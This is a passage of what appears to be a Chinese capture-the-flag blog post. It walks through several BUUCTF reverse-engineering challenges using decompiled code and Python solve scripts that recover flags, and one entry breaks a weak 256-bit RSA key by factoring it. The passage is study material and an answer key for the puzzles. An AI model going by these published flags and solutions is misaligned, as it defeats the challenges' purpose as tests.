android.support.v7.app.ActionBarActivity, android.support.v4.app.FragmentActivity</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="keyword">final</span> EditText edit = (EditText) findViewById(R.id.widget2);</span><br><span class="line">        <span class="keyword">final</span> TextView text = (TextView) findViewById(R.id.widget1);</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">char</span>[] a = &#123;<span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;e&#x27;</span>&#125;;</span><br><span class="line">        <span class="keyword">final</span> <span class="keyword">char</span>[] b = &#123;<span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>&#125;;</span><br><span class="line">        ((Button) findViewById(R.id.widget3)).setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="comment">/* class com.example.findit.MainActivity.AnonymousClass1 */</span></span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">char</span>[] x = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">17</span>];</span><br><span class="line">                <span class="keyword">char</span>[] y = <span class="keyword">new</span> <span class="keyword">char</span>[<span class="number">38</span>];</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">17</span>; i++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> ((a[i] &lt; <span class="string">&#x27;I&#x27;</span> &amp;&amp; a[i] &gt;= <span class="string">&#x27;A&#x27;</span>) || (a[i] &lt; <span class="string">&#x27;i&#x27;</span> &amp;&amp; a[i] &gt;= <span class="string">&#x27;a&#x27;</span>)) &#123;</span><br><span class="line">                        x[i] = (<span class="keyword">char</span>) (a[i] + <span class="number">18</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((a[i] &lt; <span class="string">&#x27;A&#x27;</span> || a[i] &gt; <span class="string">&#x27;Z&#x27;</span>) &amp;&amp; (a[i] &lt; <span class="string">&#x27;a&#x27;</span> || a[i] &gt; <span class="string">&#x27;z&#x27;</span>)) &#123;</span><br><span class="line">                        x[i] = a[i];</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        x[i] = (<span class="keyword">char</span>) (a[i] - <span class="string">&#x27;\b&#x27;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (String.valueOf(x).equals(edit.getText().toString())) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="keyword">int</span> i2 = <span class="number">0</span>; i2 &lt; <span class="number">38</span>; i2++) &#123;</span><br><span class="line">                        <span class="keyword">if</span> ((b[i2] &lt; <span class="string">&#x27;A&#x27;</span> || b[i2] &gt; <span class="string">&#x27;Z&#x27;</span>) &amp;&amp; (b[i2] &lt; <span class="string">&#x27;a&#x27;</span> || b[i2] &gt; <span class="string">&#x27;z&#x27;</span>)) &#123;</span><br><span class="line">                            y[i2] = b[i2];</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            y[i2] = (<span class="keyword">char</span>) (b[i2] + <span class="number">16</span>);</span><br><span class="line">                            <span class="keyword">if</span> ((y[i2] &gt; <span class="string">&#x27;Z&#x27;</span> &amp;&amp; y[i2] &lt; <span class="string">&#x27;a&#x27;</span>) || y[i2] &gt;= <span class="string">&#x27;z&#x27;</span>) &#123;</span><br><span class="line">                                y[i2] = (<span class="keyword">char</span>) (y[i2] - <span class="number">26</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    text.setText(String.valueOf(y));</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                text.setText(<span class="string">&quot;答案错了肿么办。。。不给你又不好意思。。。哎呀好纠结啊~~~&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">onOptionsItemSelected</span><span class="params">(MenuItem item)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (item.getItemId() == R.id.action_settings) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.onOptionsItemSelected(item);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a = [<span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;l&#x27;</span>,</span><br><span class="line">     <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>]</span><br><span class="line">mod = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line">aa = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">27</span>):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> a:</span><br><span class="line">        <span class="keyword">if</span> s.isalpha():</span><br><span class="line">            n = mod.find(s)</span><br><span class="line">            s = mod[n-i]</span><br><span class="line">        <span class="built_in">print</span>(s, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>()</span><br></pre></td></tr></table></figure><h1 id="0x04-GWCTF-2019-pyre"><a href="#0x04-GWCTF-2019-pyre" class="headerlink" title="0x04.[GWCTF 2019]pyre"></a>0x04.[GWCTF 2019]pyre</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Welcome to Re World!&#x27;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Your input1 is your flag~&#x27;</span></span><br><span class="line">l = <span class="built_in">len</span>(input1)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">    num = ((input1[i] + i) % <span class="number">128</span> + <span class="number">128</span>) % <span class="number">128</span></span><br><span class="line">    code += num</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l - <span class="number">1</span>):</span><br><span class="line">    code[i] = code[i] ^ code[i + <span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> code</span><br><span class="line">code = [</span><br><span class="line">    <span class="string">&#x27;\x1f&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x12&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x1d&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;(&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x01&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x06&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x14&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;,&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x1b&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;?&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;o&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;6&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;*&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;:&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x01&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;%&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x13&#x27;</span>]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">code = [</span><br><span class="line">    <span class="string">&#x27;\x1f&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x12&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x1d&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;(&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x01&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x06&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x14&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;,&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x1b&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;?&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;o&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;6&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;*&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;:&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x01&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;%&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;\x13&#x27;</span>]</span><br><span class="line"></span><br><span class="line">n = <span class="built_in">len</span>(code)</span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n-<span class="number">2</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    code[i] = <span class="built_in">chr</span>(<span class="built_in">ord</span>(code[i]) ^ <span class="built_in">ord</span>(code[i+<span class="number">1</span>])</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>((<span class="built_in">ord</span>(code[i])-i) % <span class="number">128</span>), end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>代码功底还是太烂了。</p><h1 id="0x05-ACTF新生赛2020-easyre"><a href="#0x05-ACTF新生赛2020-easyre" class="headerlink" title="0x05.[ACTF新生赛2020]easyre"></a>0x05.[ACTF新生赛2020]easyre</h1><p>peid查完是upx壳，脱壳：</p><p><img src="/2021/11/07/BUU-RE-0x01-0x1F/image-20211024154813690.png" alt="image-20211024154813690"></p><p>清晰了很多：</p><p><img src="/2021/11/07/BUU-RE-0x01-0x1F/image-20211024162234474.png" alt="image-20211024162234474"></p><p><img src="/2021/11/07/BUU-RE-0x01-0x1F/image-20211024155033211.png" alt="image-20211024155033211"></p><p>就是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># !\&quot;&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;&#x27;&#x27;~&#125;|&#123;zyxwvutsrqponmlkjihgfedcba`_^]\\[ZYXWVUTSRQPONMLKJIHGFEDCBA@?&gt;=&lt;;:9876543210/.-,+*)(&#x27;&amp;%$# !\&quot;&#x27;&#x27;&#x27;</span></span><br><span class="line">v4 = <span class="string">&#x27;&#x27;&#x27;*F&#x27;\&quot;N,\&quot;(I?+@&#x27;&#x27;&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># v4 = list(v4)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> v4:</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">str</span>.find(i)+<span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h1 id="0x06-rsa"><a href="#0x06-rsa" class="headerlink" title="0x06.rsa"></a>0x06.rsa</h1><p>第一次做RSA的题，就先看了一遍RSA的流程。</p><p>这个题给了两个文件：flag.enc，pub.key</p><blockquote><p>  公钥N = p*q,(为pub.key),e</p><p>  e是随机选择的数，d是e关于phi(N)的模反元素：ed≡1(mod phi(N))</p><p>  私钥：N,d</p></blockquote><p>copy到公钥解析的网站进行解析：<a href="http://tool.chacuo.net//cryptrsakeyparse">http://tool.chacuo.net//cryptrsakeyparse</a></p><table><thead><tr><th>key长度：</th><th>256</th></tr></thead><tbody><tr><td>模数(N)：</td><td>C0332C5C64AE47182F6C1C876D42336910545A58F7EEFEFC0BCAAF5AF341CCDD</td></tr><tr><td>指数(e)：</td><td>65537 (0x10001)</td></tr></tbody></table><p>所以：e =  65537</p><p>N = C0332C5C64AE47182F6C1C876D42336910545A58F7EEFEFC0BCAAF5AF341CCDD(要转成10进制)</p><p>再通过网站分解N得到pq：<a href="http://www.factordb.com/index.php?query=">http://www.factordb.com/index.php?query=</a></p><p>得到：</p><p>p = 285960468890451637935629440372639283459<br>q = 304008741604601924494328155975272418463</p><p>再接下来就是写exp了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> rsa</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = <span class="number">86934482296048119190666062003494800588905656017203025617216654058378322103517</span></span><br><span class="line">p = <span class="number">285960468890451637935629440372639283459</span></span><br><span class="line">q = <span class="number">304008741604601924494328155975272418463</span></span><br><span class="line"></span><br><span class="line">phin = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = gmpy2.invert(e, phin)</span><br><span class="line">key = rsa.PrivateKey(n, e, <span class="built_in">int</span>(d), p, q)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;D:\\Desktop\\output\\flag.enc&quot;</span>, <span class="string">&quot;rb+&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f = f.read()</span><br><span class="line">    <span class="built_in">print</span>(rsa.decrypt(f, key))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="0x07-ACTF新生赛2020-rome"><a href="#0x07-ACTF新生赛2020-rome" class="headerlink" title="0x07.[ACTF新生赛2020]rome"></a>0x07.[ACTF新生赛2020]rome</h1><p>简化了下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v1[<span class="number">16</span>]; <span class="comment">// [esp+14h] [ebp-44h]</span></span><br><span class="line">  <span class="keyword">char</span> input_str[<span class="number">22</span>]; <span class="comment">// [esp+24h] [ebp-34h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> local_str[<span class="number">29</span>]; <span class="comment">// [esp+3Bh] [ebp-1Dh] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(local_str, <span class="string">&quot;Qsw3sj_lz4_Ujw@l&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, input_str);</span><br><span class="line">  result = input_str[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">if</span> ( input_str[<span class="number">0</span>] == <span class="string">&#x27;A&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = input_str[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">if</span> ( input_str[<span class="number">1</span>] == <span class="string">&#x27;C&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = input_str[<span class="number">2</span>];</span><br><span class="line">      <span class="keyword">if</span> ( input_str[<span class="number">2</span>] == <span class="string">&#x27;T&#x27;</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        result = input_str[<span class="number">3</span>];</span><br><span class="line">        <span class="keyword">if</span> ( input_str[<span class="number">3</span>] == <span class="string">&#x27;F&#x27;</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          result = input_str[<span class="number">4</span>];</span><br><span class="line">          <span class="keyword">if</span> ( input_str[<span class="number">4</span>] == <span class="string">&#x27;&#123;&#x27;</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            result = input_str[<span class="number">21</span>];</span><br><span class="line">            <span class="keyword">if</span> ( input_str[<span class="number">21</span>] == <span class="string">&#x27;&#125;&#x27;</span> )</span><br><span class="line">            &#123;</span><br><span class="line">              *v1 = *&amp;input_str[<span class="number">5</span>];</span><br><span class="line">              *&amp;v1[<span class="number">4</span>] = *&amp;input_str[<span class="number">9</span>];</span><br><span class="line">              *&amp;v1[<span class="number">8</span>] = *&amp;input_str[<span class="number">13</span>];</span><br><span class="line">              *&amp;v1[<span class="number">12</span>] = *&amp;input_str[<span class="number">17</span>];</span><br><span class="line">              *&amp;local_str[<span class="number">17</span>] = <span class="number">0</span>;</span><br><span class="line">              <span class="keyword">while</span> ( *&amp;local_str[<span class="number">17</span>] &lt;= <span class="number">15</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">if</span> ( v1[*&amp;local_str[<span class="number">17</span>]] &gt; <span class="number">64</span> &amp;&amp; v1[*&amp;local_str[<span class="number">17</span>]] &lt;= <span class="number">90</span> )<span class="comment">// 大写</span></span><br><span class="line">                  v1[*&amp;local_str[<span class="number">17</span>]] = (v1[*&amp;local_str[<span class="number">17</span>]] - <span class="number">51</span>) % <span class="number">26</span> + <span class="number">65</span>;</span><br><span class="line">                <span class="keyword">if</span> ( v1[*&amp;local_str[<span class="number">17</span>]] &gt; <span class="number">96</span> &amp;&amp; v1[*&amp;local_str[<span class="number">17</span>]] &lt;= <span class="number">122</span> )<span class="comment">// 小写</span></span><br><span class="line">                  v1[*&amp;local_str[<span class="number">17</span>]] = (v1[*&amp;local_str[<span class="number">17</span>]] - <span class="number">79</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">                ++*&amp;local_str[<span class="number">17</span>];</span><br><span class="line">              &#125;</span><br><span class="line">              *&amp;local_str[<span class="number">17</span>] = <span class="number">0</span>;</span><br><span class="line">              <span class="keyword">while</span> ( *&amp;local_str[<span class="number">17</span>] &lt;= <span class="number">15</span> )</span><br><span class="line">              &#123;</span><br><span class="line">                result = local_str[*&amp;local_str[<span class="number">17</span>]];</span><br><span class="line">                <span class="keyword">if</span> ( v1[*&amp;local_str[<span class="number">17</span>]] != result )</span><br><span class="line">                  <span class="keyword">return</span> result;</span><br><span class="line">                ++*&amp;local_str[<span class="number">17</span>];</span><br><span class="line">              &#125;</span><br><span class="line">              result = <span class="built_in">printf</span>(<span class="string">&quot;You are correct!&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">local = <span class="string">&quot;Qsw3sj_lz4_Ujw@l&quot;</span></span><br><span class="line">a = <span class="number">0</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">128</span>):</span><br><span class="line">        a = i</span><br><span class="line">        <span class="keyword">if</span> i &gt; <span class="number">64</span>:</span><br><span class="line">            <span class="keyword">if</span> i &lt;= <span class="number">90</span>:</span><br><span class="line">                a = (i-<span class="number">51</span>) % <span class="number">26</span> + <span class="number">65</span></span><br><span class="line">        <span class="keyword">if</span> i &gt; <span class="number">96</span>:</span><br><span class="line">            <span class="keyword">if</span> i &lt;= <span class="number">122</span>:</span><br><span class="line">                a = (i-<span class="number">0x4f</span>) % <span class="number">26</span> + <span class="number">97</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">chr</span>(a) == local[k]:</span><br><span class="line">            flag += <span class="built_in">chr</span>(i)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h1 id="0x08-2019红帽杯-easyRE"><a href="#0x08-2019红帽杯-easyRE" class="headerlink" title="0x08.[2019红帽杯]easyRE"></a>0x08.[2019红帽杯]easyRE</h1><p>讲真我还是太拉了，这题把wp看了半天，代码也看了半天。。。先看题吧：</p><p>刚进去代码完全看不懂，然后应该是要输入些什么东西，</p><p><img src="/2021/11/07/BUU-RE-0x01-0x1F/image-20211025193922062.png" alt="image-20211025193922062"></p><p>这里是将输入的东西异或后与本地的字符串比较，解一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">local_str = [<span class="number">73</span>, <span class="number">111</span>, <span class="number">100</span>, <span class="number">108</span>, <span class="number">62</span>, <span class="number">81</span>, <span class="number">110</span>, <span class="number">98</span>, <span class="number">40</span>, <span class="number">111</span>, <span class="number">99</span>, <span class="number">121</span>, <span class="number">127</span>, <span 